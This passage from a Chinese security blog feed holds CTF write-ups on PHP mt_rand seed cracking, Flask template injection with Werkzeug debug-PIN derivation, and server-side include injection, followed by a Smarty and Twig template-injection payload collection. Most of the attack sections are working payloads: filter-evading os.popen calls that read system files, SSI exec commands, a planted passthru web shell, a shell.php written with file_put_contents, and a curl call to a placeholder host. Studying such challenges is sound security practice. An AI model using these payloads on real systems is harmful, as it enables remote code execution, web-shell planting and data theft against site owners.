      <link href="2021/02/08/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96(PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98)/"/>
      <url>2021/02/08/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96(PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98)/</url>
      
        <content type="html"><![CDATA[<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>关键js代码</p><p> <img src="image.png" alt="image.png"> </p><p>然后到check.php</p><p>直接给了代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以看到种子是存在session里面的,所以抽奖序列是固定的.</p><p>然后根据显示的10位数据可以爆破出seed.可以直接用php_mt_seed爆破seed,不过也需要运气</p><p>生成php_mt_seed所需参数(php_mt_seed4.0版本更好用)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;FEVzjlfnuz&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> i == s[j]:</span><br><span class="line">            m += <span class="string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="built_in">format</span>(j,j,<span class="built_in">len</span>(s)-<span class="number">1</span>)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p> 然后再爆破  </p><p><img src="image-1613554874544.png" alt="image.png"> </p><p> 然后生成抽奖序列即可 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">0x0185ab6d</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">20</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, <span class="number">61</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
            <tag> PHP </tag>
            
            <tag> 伪随机数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-FlaskApp&amp;Flask pin码伪造</title>
      <link href="2021/02/07/%5BGYCTF2020%5DFlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/"/>
      <url>2021/02/07/%5BGYCTF2020%5DFlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<p> 随便输点什么,让程序报错 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><p>发现有render_template_string,尝试模板注入.</p><p>尝试<code>&#123;&#123;8*8&#125;&#125;</code>发现被过滤了.但是<code>&#123;&#123;1+1&#125;&#125;</code>可以</p><p>然后逐个测试发现过滤了 * os popen</p><p>用下面的可以bypass</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125; </span><br></pre></td></tr></table></figure><p>然后非预期了=.=</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;cat /this_is_the_fla&quot;&quot;g.txt&#x27;</span>).read() &#125;&#125; </span><br></pre></td></tr></table></figure><p>尝试下预期解,即通过推测flask PIN码值来getshell.解出pin码需要六个变量,执行上面的命令可分别得到</p><p> 获取mac地址 发现有两个,可以逐个尝试,(一般为eth0) </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;ls /sys/class/net&#x27;</span>).read() &#125;&#125; </span><br><span class="line">=&gt; eth0 eth2 lo</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;cat /sys/class/net/eth0/address&#x27;</span>).read() &#125;&#125; </span><br><span class="line">=&gt; 02:42:ac:10:bb:49 =&gt; print(0x0242ac10bb4a9) =&gt; 2485377874761</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;cat /sys/class/net/eth2/address&#x27;</span>).read() &#125;&#125; </span><br><span class="line">=&gt; 52:54:00:92:05:19 =&gt; 90520740300057</span><br></pre></td></tr></table></figure><p> <strong>docker机器id</strong> :</p><p>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件。<br>对于docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;cat /proc/self/cgroup&#x27;</span>).read() &#125;&#125; </span><br><span class="line">=&gt; </span><br><span class="line"><span class="number">12</span>:blkio:/docker/65b80ff4920dd1ae0f9421d925d4c71a402723842b43120c9dbf76c88c2828e2 ... ...</span><br></pre></td></tr></table></figure><p> 然后根据下面脚本推算pin码 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377874761&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;65b80ff4920dd1ae0f9421d925d4c71a402723842b43120c9dbf76c88c2828e2&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p> 运行脚本得到 226-086-217 ,然后开启上帝模式 </p> <img src="image.png" alt="image.png" style="zoom:200%;" /> <p> 参考 <a href="https://xz.aliyun.com/t/2553#toc-2">https://xz.aliyun.com/t/2553#toc-2</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-EasySearch&amp;&amp;SSI</title>
      <link href="2021/02/05/%5BBJDCTF2020%5DEasySearch&amp;&amp;SSI/"/>
      <url>2021/02/05/%5BBJDCTF2020%5DEasySearch&amp;&amp;SSI/</url>
      
        <content type="html"><![CDATA[<p>之前文件上传只知道可以上传.shtml文件,但是不知道怎么利用.</p><p>现在才知道这个叫 服务器端包含注入 <a href="https://www.secpulse.com/archives/66934.html">https://www.secpulse.com/archives/66934.html</a></p><blockquote><p>Server Side Includes 服务器端包含 </p></blockquote><p> 命令执行poc </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span></span><br></pre></td></tr></table></figure><p>本题存在文件泄.index.php.swp</p><p>代码分析:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">        <span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">        <span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">        <span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    ***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    ***</span><br><span class="line">    &#125;</span><br><span class="line">   ***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 比较关键的一个点 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) </span><br><span class="line">xxx</span><br></pre></td></tr></table></figure><p> 可以尝试爆破一下 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">100000000000</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$i</span>),<span class="number">0</span>,<span class="number">6</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2020666[Finished in 1.0s]</span></span><br></pre></td></tr></table></figure><p> 然后可以在返回头里面找到生成的文件 </p><p> <img src="image.png" alt="image.png"> </p><p> payload: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--<span class="comment">#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
            <tag> SSI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP模板注入</title>
      <link href="2021/02/03/PHP%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>2021/02/03/PHP%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>主要是记录下一些payload</p><p>smarty:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> readfile(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; smarty中的&#123;<span class="keyword">if</span>&#125;标签中可以执行php语句</span><br><span class="line">&#123;<span class="variable">$smarty</span>.version&#125; 返回版本信息</span><br><span class="line">$&#123;smarty.template&#125; 返回当前模板的文件名</span><br><span class="line">使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令 <span class="number">3.1</span>版本已经废弃</span><br><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(“file:<span class="comment">///etc/passwd”)&#125;</span></span><br><span class="line">&#123;literal&#125;alert(<span class="string">&#x27;xss&#x27;</span>);&#123;/literal&#125;</span><br><span class="line">&#123;literal&#125;&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;&#123;/literal&#125; PHP <span class="number">5.</span>x</span><br><span class="line">&#123;system(<span class="string">&quot;id&quot;</span>)&#125; 最简单,枯燥的一个</span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123; readfile(<span class="string">&#x27;/flag&#x27;</span>) &#125;</span><br><span class="line">&#123;<span class="keyword">if</span> show_source(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;php&#125;<span class="keyword">echo</span> `id`;&#123;/php&#125;</span><br></pre></td></tr></table></figure><p> Twig :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;system&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;/etc/passwd&#x27;</span>|file_excerpt(<span class="number">-1</span>,<span class="number">-1</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.query.filter(<span class="number">0</span>,<span class="string">&#x27;curl$&#123;IFS&#125;x.x.x.x:8090&#x27;</span>,<span class="number">1024</span>,&#123;<span class="string">&#x27;options&#x27;</span>:<span class="string">&#x27;system&#x27;</span>&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>链接: </p><p>模板注入漏洞全汇总<a href="https://cloud.tencent.com/developer/article/1516336">https://cloud.tencent.com/developer/article/1516336</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a></p><p>TWIG 